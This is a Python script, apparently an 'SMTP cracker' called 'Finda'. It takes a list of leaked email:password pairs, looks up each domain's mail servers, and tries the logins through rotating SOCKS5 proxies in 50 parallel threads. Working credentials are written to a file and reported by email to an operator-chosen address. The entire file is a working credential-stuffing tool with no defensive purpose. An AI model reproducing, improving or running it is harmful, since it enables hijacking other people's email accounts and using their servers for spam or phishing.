import dns.resolver
from colorama import Fore
from ConnectSock5 import connectProxy
from Maker import *
from SendEmail import *
from concurrent.futures import *
import argparse


smtp_file_name = "24022023.txt" #location to save working smtp
senda_name = "Finda on Deck"
attach_file = ""
attach_file_name = ""
subject = "working smtp found with Finda"

Id = 0
count = 0
spliter = 0
msg_file = '''o'''


not_working_serva = []
not_working_sock5 = []
sock_file_length = 0




def Check_Dns(domain):
    global sock_file_length
    try:
        answers = dns.resolver.resolve(domain,'NS', lifetime=5) #check ns record of emails
        for server in answers:
            pass
        host = server.target
        host = str(host).partition('.')[2][:-1] #get the host
        return host
    
    except Exception as e:
        sock_file_length += 1
        Recall_Sock5(sock_file_length, sock_file_total_line)
        return Fore.LIGHTBLACK_EX + f'{e}'
        

def em_brk(self):
    self = str(self).partition('@')[2]
    self = str(self).strip()
    return self


def saver(host, port, email, pwd, Fname):
    global Id
    with open(Fname, 'a') as KE:
       KE.write(f"{host}:{port}:{email}:{pwd}\n")
        
         
def SetLogin(self):
        try:
            F = str(self).strip()
            email = str(F).partition(':')[0]
            pwd = str(F).partition(':')[2]   
            RD = Ready(email, pwd)
            return RD
        except Exception as e:
            return f'error opening combo file. {e}'
        
        
def Ready(email, pwd):
    global not_working_serva,count,sock_file_length
    host = Check_Dns(em_brk(email)) #Ns record from email
    if host == "None":
        return "No DNS HOST FOUND"             
    else:
        smtp_host, port = Check_Smtp_Host(host, 0) # check the smtp server name
        if smtp_host in not_working_serva:
            return Fore.BLACK +  f'Bad Smtp Host {smtp_host}'
        else:
            if Connect_Smtp_serva(smtp_host,port): #try to connect to the server returns True if connection is successful
                pass      
            else:
                smtp_host, port = Check_Smtp_Host(host,1) # check the smtp server name
                if Connect_Smtp_serva(smtp_host,port):
                    pass
                else:
                    smtp_host, port = Check_Smtp_Host(host,2)  # check the smtp server name   
                    if Connect_Smtp_serva(smtp_host,port):
                        pass
                    else:
                        return Fore.BLACK + f"Unable to Connect to Smtp Server [{smtp_host} : {port}]"
            if Login_(smtp_host, port, email, pwd):
                if Send_Email(smtp_host, port, email, pwd, recv_email,msg_file, senda_name, subject) == 0:
                    saver(smtp_host,port,email,pwd,smtp_file_name)
                    return Fore.YELLOW + f'[Send working] [ {smtp_host} : {port} ] [ {email} : {pwd} ]'
                else:
                    return Fore.GREEN + f"[Login Success] [{smtp_host}:{port}] [{email} : {pwd} ]"
            else:
                return Fore.RED + f'[Login Failed] [{smtp_host}:{port}] [{email} : {pwd} ]'
        
        
def Recall_Sock5(index, total):
    global sock_file
    if index > total:
       index = 0
    else:
        index +=1
        Get_sock5(sock_file, index)            
            
            
def Get_sock5(sock_file, sock_file_length): #connect to sock5
    try:    
        sock5_host, sock5_port, none, none,  = Choose_Serva(sock_file, sock_file_length)
        if connectProxy(sock5_host, sock5_port, proxyType):
            pass
        else:
            not_working_sock5.append(sock5_host)
            Recall_Sock5(sock_file_length, sock_file_total_line)
    except Exception as e:
       return e
   
   
def Start():
    global sock_file_length, sock_file
    Get_sock5(sock_file, sock_file_length)
    try:
        with open(smtp_file, 'r') as F:
            with ThreadPoolExecutor(max_workers=50) as executor:
                results = executor.map(SetLogin, F)
                for res in results:
                    print(f'--[ {res} ]--')
    except KeyboardInterrupt:
        exit()

 
def Check_MX(domain: str = "dnspython.org"):
    mail_servers = dns.resolver.resolve(domain, 'MX')
    mail_servers = list(set([data.exchange.to_text() for data in mail_servers]))
    return mail_servers         
parser = argparse.ArgumentParser()
parser.add_argument('file')
parser.add_argument('-s', '--proxy')
parser.add_argument('-p', '--proxyType')
parser.add_argument('-e', '--email')

args = parser.parse_args()
try:
    sock_file = args.proxy
    proxyType = args.proxyType
    #Get the length of the sock5 file
    try:
        with open(sock_file,'r') as S:
            sock_file_total_line = S.readlines()
            sock_file_total_line = len(list(sock_file_total_line))
    except:
        sock_file_total_line = 0
        pass            
except:pass

try:recv_email = args.email
except:recv_email = 'null@null.com'

smtp_file = args.file
Start()

#